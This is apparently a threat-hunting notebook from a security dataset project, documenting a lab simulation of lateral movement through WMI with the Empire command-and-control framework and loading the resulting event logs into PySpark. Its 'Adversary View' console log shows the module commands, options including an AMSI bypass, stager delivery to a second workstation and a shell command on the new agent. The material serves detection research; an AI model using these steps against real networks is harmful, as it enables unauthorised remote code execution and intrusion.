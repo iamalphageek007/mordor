{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Invoke WMI"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/09/21 |\n",
    "| Modification Date | 2020/09/22 |\n",
    "| Tactics           | ['[TA0002](https://attack.mitre.org/tactics/TA0002)', '[TA0008](https://attack.mitre.org/tactics/TA0008)'] |\n",
    "| Techniques        | ['[T1047](https://attack.mitre.org/techniques/T1047)'] |\n",
    "| Tags              | ['WMI IWbemServices ExecMethod'] |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents an adversary remotely executing code via WMI. This dataset focuses on the use of the WMI Win32_Process class and method Create to execute code remotely."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Dataset Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod.zip](https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/network/empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod.zip](https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/network/empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Notebooks\n",
    "Notebooks created by the community leveraging the mordor datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Author | Name | Link |\n",
    "|:-------|:-----|:-----|"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Simulation Plan"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Environment | Tool Type | Module |\n",
    "|:------------|:----------|:-------|\n",
    "| Mordor shire | C2 | [lateral_movement](https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/lateral_movement/invoke_wmi.py) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: agents) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \n",
    "HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \n",
    "UF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http            \n",
    "\n",
    "AWTK7BX5 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         2228   5/0.0    2020-09-21 04:06:27  http            \n",
    "\n",
    "(Empire: agents) > interact AWTK7BX5\n",
    "(Empire: AWTK7BX5) > usemodule lateral_movement/invoke_wmi\n",
    "(Empire: powershell/lateral_movement/invoke_wmi) > set Listener http\n",
    "(Empire: powershell/lateral_movement/invoke_wmi) > set ComputerName WORKSTATION6.theshire.local\n",
    "(Empire: powershell/lateral_movement/invoke_wmi) > info\n",
    "\n",
    "              Name: Invoke-WMI\n",
    "            Module: powershell/lateral_movement/invoke_wmi\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @harmj0y\n",
    "\n",
    "Description:\n",
    "  Executes a stager on remote hosts using WMI.\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value                     Description\n",
    "  ----             --------    -------                   -----------\n",
    "  Agent            True        AWTK7BX5                  Agent to run module on.                 \n",
    "  CredID           False                                 CredID from the store to use.           \n",
    "  ComputerName     True        WORKSTATION6.theshire.lo  Host[s] to execute the stager on, comma \n",
    "                              cal                       separated.                              \n",
    "  Listener         False       http                      Listener to use.                        \n",
    "  Command          False                                 Custom command to run.                  \n",
    "  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n",
    "                                                        powershell code, uses the               \n",
    "                                                        ObfuscateCommand for obfuscation types. \n",
    "                                                        For powershell only.                    \n",
    "  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n",
    "                                                        Only used if Obfuscate switch is True.  \n",
    "                                                        For powershell only.                    \n",
    "  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n",
    "                                                        the stager code.                        \n",
    "  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n",
    "                                                        the stager code.                        \n",
    "  UserName         False                                 [domain\\]username to use to execute     \n",
    "                                                        command.                                \n",
    "  Password         False                                 Password to use to execute command.     \n",
    "  UserAgent        False       default                   User-agent string to use for the staging\n",
    "                                                        request (default, none, or other).      \n",
    "  Proxy            False       default                   Proxy to use for request (default, none,\n",
    "                                                        or other).                              \n",
    "  ProxyCreds       False       default                   Proxy credentials                       \n",
    "                                                        ([domain\\]username:password) to use for \n",
    "                                                        request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_wmi) > execute\n",
    "[*] Tasked AWTK7BX5 to run TASK_CMD_WAIT\n",
    "[*] Agent AWTK7BX5 tasked with task ID 3\n",
    "[*] Tasked agent AWTK7BX5 to run module powershell/lateral_movement/invoke_wmi\n",
    "(Empire: powershell/lateral_movement/invoke_wmi) > \n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6\n",
    "[*] New agent EHUNP61R checked in\n",
    "[+] Initial agent EHUNP61R from 172.18.39.6 now active (Slack)\n",
    "[*] Sending agent (stage 2) to EHUNP61R at 172.18.39.6\n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_wmi) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \n",
    "HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \n",
    "UF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http            \n",
    "\n",
    "AWTK7BX5 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         2228   5/0.0    2020-09-21 04:14:58  http            \n",
    "EHUNP61R ps 172.18.39.6     WORKSTATION6      *THESHIRE\\pgustavo      powershell         9804   5/0.0    2020-09-21 04:14:56  http            \n",
    "\n",
    "(Empire: agents) > interact EHUNP61R\n",
    "(Empire: EHUNP61R) > shell whoami\n",
    "[*] Tasked EHUNP61R to run TASK_SHELL\n",
    "[*] Agent EHUNP61R tasked with task ID 1\n",
    "(Empire: EHUNP61R) > \n",
    "theshire\\pgustavo\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: EHUNP61R) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT Hostname,Channel,EventID, Count(*) as count\n",
    "FROM mordorTable\n",
    "GROUP BY Hostname,Channel,EventID\n",
    "ORDER BY count DESC\n",
    "'''\n",
    ")\n",
    "df.show(truncate=False)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
